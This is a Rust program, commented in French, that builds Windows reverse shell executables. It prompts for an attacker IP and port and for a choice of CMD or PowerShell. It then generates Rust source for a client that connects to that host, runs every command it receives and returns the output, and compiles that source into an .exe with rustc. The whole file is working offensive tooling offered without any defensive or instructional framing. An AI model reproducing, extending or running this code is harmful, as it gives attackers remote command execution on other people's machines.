use std::fs::File;
use std::io::{self, Write};
use std::process::Command;

fn main() {
    println!("=== Configuration du reverse shell ===");

    // Demander à l'utilisateur de saisir l'IP de l'attaquant
    print!("Entrez l'adresse IP du serveur: ");
    io::Write::flush(&mut io::stdout()).unwrap(); // Forcer l'affichage immédiat
    let mut ip = String::new();
    io::stdin().read_line(&mut ip).unwrap();
    let ip = ip.trim(); // Retirer les espaces et sauts de ligne

    // Demander à l'utilisateur de saisir le port
    print!("Entrez le port: ");
    io::Write::flush(&mut io::stdout()).unwrap();
    let mut port = String::new();
    io::stdin().read_line(&mut port).unwrap();
    let port = port.trim();

    // Demander à l'utilisateur de choisir entre CMD et PowerShell
    println!("Choisissez le type de reverse shell:");
    println!("1. CMD");
    println!("2. PowerShell");
    print!("Votre choix (1 ou 2) : ");
    io::Write::flush(&mut io::stdout()).unwrap();
    let mut choice = String::new();
    io::stdin().read_line(&mut choice).unwrap();
    let choice = choice.trim();

    // Générer le code approprié
    let (source_code, output_name) = match choice {
        "1" => (
            generate_cmd_code(ip, port),
            "reverse_shell_cmd.exe".to_string(),
        ),
        "2" => (
            generate_powershell_code(ip, port),
            "reverse_shell_powershell.exe".to_string(),
        ),
        _ => {
            println!("Choix invalide. Veuillez relancer le programme et choisir 1 ou 2.");
            return;
        }
    };

    // Écrire le code source dans un fichier temporaire
    let file_name = "reverse_shell.rs";
    match File::create(file_name) {
        Ok(mut file) => {
            if let Err(e) = file.write_all(source_code.as_bytes()) {
                eprintln!("Erreur lors de l'écriture du fichier: {}", e);
                return;
            }
            println!("Fichier source '{}' généré avec succès.", file_name);
        }
        Err(e) => {
            eprintln!("Erreur lors de la création du fichier: {}", e);
            return;
        }
    }

    // Compiler le fichier source en exécutable
    println!("Compilation du fichier...");
    match Command::new("rustc")
        .arg(file_name)
        .arg("-o")
        .arg(&output_name)
        .output()
    {
        Ok(output) => {
            if !output.stderr.is_empty() {
                eprintln!(
                    "Erreur de compilation: {}",
                    String::from_utf8_lossy(&output.stderr)
                );
            } else {
                println!("Binaire '{}' compilé avec succès.", output_name);
            }
        }
        Err(e) => eprintln!("Erreur lors de l'exécution de rustc: {}", e),
    }

    // Nettoyer le fichier temporaire
    let _ = std::fs::remove_file(file_name);
}

fn generate_cmd_code(ip: &str, port: &str) -> String {
    format!(
        r#"
use std::net::TcpStream;
use std::process::{{Command, Stdio}};
use std::io::{{Read, Write}};

fn main() {{
    let server_ip = "{ip}";
    let server_port = "{port}";

    if let Ok(mut stream) = TcpStream::connect(format!("{{}}:{{}}", server_ip, server_port)) {{
        loop {{
            let mut buffer = [0; 1024];
            match stream.read(&mut buffer) {{
                Ok(size) if size > 0 => {{
                    let command = String::from_utf8_lossy(&buffer[..size]);
                    let output = execute_command(command.trim());
                    let _ = stream.write(output.as_bytes());
                }}
                _ => break,
            }}
        }}
    }}
}}

fn execute_command(command: &str) -> String {{
    let mut parts = command.split_whitespace();
    if let Some(cmd) = parts.next() {{
        let args: Vec<&str> = parts.collect();
        match Command::new(cmd)
            .args(&args)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
        {{
            Ok(output) => {{
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                format!("{{}}\n{{}}", stdout, stderr)
            }}
            Err(e) => format!("Error executing command: {{}}\n", e),
        }}
    }} else {{
        "Invalid command.\n".to_string()
    }}
}}
"#
    )
}

fn generate_powershell_code(ip: &str, port: &str) -> String {
    format!(
        r#"
use std::net::TcpStream;
use std::process::{{Command, Stdio}};
use std::io::{{Read, Write}};

fn main() {{
    let server_ip = "{ip}";
    let server_port = "{port}";

    if let Ok(mut stream) = TcpStream::connect(format!("{{}}:{{}}", server_ip, server_port)) {{
        loop {{
            let mut buffer = [0; 1024];
            match stream.read(&mut buffer) {{
                Ok(size) if size > 0 => {{
                    let command = String::from_utf8_lossy(&buffer[..size]);
                    let output = execute_powershell_command(command.trim());
                    let _ = stream.write(output.as_bytes());
                }}
                _ => break,
            }}
        }}
    }}
}}

fn execute_powershell_command(command: &str) -> String {{
    let cmd = format!("powershell -NoProfile -Command {{}}", command);
    match Command::new("cmd")
        .arg("/C")
        .arg(cmd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
    {{
        Ok(output) => {{
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            format!("{{}}\n{{}}", stdout, stderr)
        }}
        Err(e) => format!("Error executing PowerShell command: {{}}\n", e),
    }}
}}
"#
    )
}
